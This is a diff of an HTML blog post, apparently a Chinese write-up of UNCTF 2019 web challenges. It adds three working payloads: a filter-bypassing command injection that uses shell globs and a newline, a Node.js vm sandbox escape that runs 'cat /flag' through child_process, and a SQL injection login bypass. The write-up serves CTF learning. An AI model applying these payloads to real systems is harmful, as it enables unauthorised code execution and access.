@@ -24,7 +24,9 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/27/FytOSwC8WBf4dDL.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/27/fWM2YnEmtbsXR5J.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/27/91ibqya8nuv3w4t.png">
-<meta property="og:updated_time" content="2019-10-31T01:41:56.264Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/31/3ThHvdXNCYEkSIb.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/31/3H4FPj8Jen7uMmX.png">
+<meta property="og:updated_time" content="2019-10-31T08:04:35.184Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="unctf竞技赛-web">
 <meta name="twitter:image" content="https://i.loli.net/2019/10/24/5lg8q6MOGfAC9VN.png">
@@ -192,7 +194,7 @@
 <p>导致最后进不了循环</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">            return $content;</span><br></pre></td></tr></table></figure>
 
-<p>但是这里的removeXSS()和原题不同</p>
+<p>因为这里的removeXSS()和原漏洞中的不同</p>
 <p><img src="https://i.loli.net/2019/10/24/5lg8q6MOGfAC9VN.png" alt="Snipaste_2019-10-24_20-28-09.png"></p>
 <p>然后一开始我总是纠结于局部绕过，发现并不能行，最后在力哥提示下👍，办法其实也很简单，利用下面的字符串替换（换中换）</p>
 <p><img src="https://i.loli.net/2019/10/24/bdhQyftpTmN7oPS.png" alt="Snipaste_2019-10-24_20-42-28.png"></p>
@@ -263,6 +265,37 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;flag.php cat</span><br></pre></td></tr></table></figure>
 
 <p>等wp出了补一补把</p>
+<p>==========================================================================</p>
+<h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><p><img src="https://i.loli.net/2019/10/31/3ThHvdXNCYEkSIb.png" alt="0.png"></p>
+<p>发现正则表达式中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\\|*\|\n|</span><br></pre></td></tr></table></figure>
+
+<p>有点问题，相当于匹配了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|*|\n</span><br></pre></td></tr></table></figure>
+
+<p>所以%0a、\、*都被可以使用，过滤了<code>bin</code>以及<code>grep</code>，可以用+绕过空格，最后如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/gr[d-f]p</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=11\&amp;b=%0a/???/gr[d-f]p+-r+.+.+.%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/31/3H4FPj8Jen7uMmX.png" alt="Snipaste_2019-10-31_15-44-01.png"></p>
+<h4 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h4><p>知识盲区。。。</p>
+<p>nodejs就是运行在服务端的 JavaScript。 因此存在与后端的交互。</p>
+<p>在calc的源码中存在eval()函数。。。。然后就参考wp</p>
+<blockquote>
+<p>想要执行命令需要先绕过nodejs的vm模块，使用<code>this.constructor.constructor</code>（Object 类的 constructor 是外层的 Function 类）来完成逃逸，从而利用rce漏洞来读取flag文件，payload关键如下所示 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;(new this.constructor.constructor(&quot;return this.process.mainModule.require;&quot;))()(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();&apos;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-file-manage"><a href="#easy-file-manage" class="headerlink" title="easy_file_manage"></a>easy_file_manage</h3><h3 id="K-amp-K战队的老家"><a href="#K-amp-K战队的老家" class="headerlink" title="K&amp;K战队的老家"></a>K&amp;K战队的老家</h3><ul>
+<li><p>1、万能密码</p>
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;||1||&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>论字典的重要性。。</strong></p>
+</li>
+</ul>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p> <a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a> </p>
 
       
 
@@ -530,19 +563,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -566,11 +599,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">命令执行与代码执行</a>
+                <a href="javascript:void(0)" class="js-tag color3">codebreaking</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">codebreaking</a>
+                <a href="javascript:void(0)" class="js-tag color5">命令执行与代码执行</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -594,7 +627,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -602,15 +635,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
               </li>
              
               <li class="article-tag-list-item">
